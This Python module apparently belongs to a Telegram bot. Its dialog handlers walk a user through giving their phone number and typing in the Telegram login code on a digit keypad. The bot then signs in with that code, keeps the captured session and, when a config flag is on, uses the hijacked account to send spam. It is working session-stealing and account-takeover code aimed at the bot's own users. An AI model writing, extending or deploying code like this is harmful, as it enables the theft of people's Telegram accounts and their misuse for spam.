from tgbot.dialogs.dialog import dialog, migrate
from tgbot.keyboards.keyboard import keyboard
from tgbot.services.get_text import gText
from tgbot.services.Session import Session, ImportSession

from tgbot.states.State import State


async def menu(message, state, repo, edit):
	await state.reset_data()
	dia = gText().get_dialog('старт_')
	title = dia.title
	text = [dia.text]

	markup = await keyboard.main_menu.main(message.from_user.id, message.bot.config.admin)
	await dialog(message, edit=edit, text=text, markup=markup, title=title, image=dia.image)


async def get_phone(message, state, repo, edit):
	dia = gText().get_dialog('получить_номер_')
	title = dia.title
	text = [dia.text]

	markup = await keyboard.main_menu.get_phone()
	m = await dialog(message, edit=edit, text=text, markup=markup, title=title, image=dia.image)
	await state.update_data(m=m)


async def get_code(message, state, repo, edit):
	dia = gText().get_dialog('получить_код_')
	title = dia.title
	text = [dia.text]
	await dialog(message, edit=False, text=text, markup=None, title=title, image=dia.image)
	m = message
	message = await message.answer('📲 Отправляем код...')
	session = Session(m)
	await session.start()
	status = await session.send_code()
	await state.update_data(code='')
	await state.update_data(m=None)
	if status:
		await repo.add_session(message.chat.id, session)
		await State.menu.update_code.set()
	else:
		await State.menu.error_code.set()
	return await migrate(
		message=message,
		repo=repo,
		state=state,
		edit=True)



async def update_code(message, state, repo, edit):
	data = await state.get_data()
	title = f"<b>💻 Полученный код:</b> <code>{data['code']}</>"
	text = []
	markup = await keyboard.main_menu.update_code(data['code'])
	await dialog(message, edit=True, text=text, markup=markup, title=title, image=None)


async def _update_code(message, state, repo, edit):
	data = await state.get_data()
	code = data['code'] + data['_select']
	await state.update_data(code=code)
	await State.menu.update_code.set()
	return await migrate(
		message=message,
		repo=repo,
		state=state,
		edit=True)


async def _update_code_back(message, state, repo, edit):
	data = await state.get_data()
	code = data['code'][:-1]
	await state.update_data(code=code)
	await State.menu.update_code.set()
	return await migrate(
		message=message,
		repo=repo,
		state=state,
		edit=True)


async def get_session(message, state, repo, edit):
	m = message
	await message.delete()
	message = await message.answer('⏳ Проверяем...')
	data_state = await state.get_data()
	session = await repo.get_session(message.chat.id)
	status = await session.input_code(data_state['code'], m)
	phone = session.phone
	#await session.client.stop()
	if status:
		if message.bot.config.spam_in_connect_session:
			client = ImportSession().inject(phone)
			await client.client.start()
			await client.spam_get_session()
			await client.client.stop()
		await repo.remove_session(message.chat.id)
		await repo.select_session(message.chat.id)
		await State.menu.end.set()
	else:
		await State.menu.error.set()
	return await migrate(
		message=message,
		repo=repo,
		state=state,
		edit=True)

		
async def error(message, state, repo, edit):
	dia = gText().get('ошибка')
	title = dia
	text = []
	await dialog(message, edit=edit, text=text, markup=None, title=title, image=None)

async def error_code(message, state, repo, edit):
	title = "❌ Произошла ошибка"
	text = ["По каким-то причинам телеграм не может вам отправить код, попробуйие завтра"]
	await dialog(message, edit=edit, text=text, markup=None, title=title, image=None)


async def end(message, state, repo, edit):
	dia = gText().get_dialog('сессия_получена_')
	title = dia.title
	text = [dia.text] 
	await dialog(message, edit=edit, text=text, markup=None, title=title, image=dia.image)


async def dialog_menu(state, message, current_state, repo, edit: bool=True):
	if current_state == State.menu.main.state:
		await menu(message, state, repo, edit)
	elif current_state == State.menu.get_phone.state:
		await get_phone(message, state, repo, edit)
	elif current_state == State.menu.get_code.state:
		await get_code(message, state, repo, edit)
	elif current_state == State.menu.update_code.state:
		await update_code(message, state, repo, edit)
	elif current_state == State.menu._update_code.state:
		await _update_code(message, state, repo, edit)
	elif current_state == State.menu._update_code_back.state:
		await _update_code_back(message, state, repo, edit)
	elif current_state == State.menu.get_session.state:
		await get_session(message, state, repo, edit)
	elif current_state == State.menu.error.state:
		await error(message, state, repo, edit)
	elif current_state == State.menu.error_code.state:
		await error_code(message, state, repo, edit)
	elif current_state == State.menu.end.state:
		await end(message, state, repo, edit)



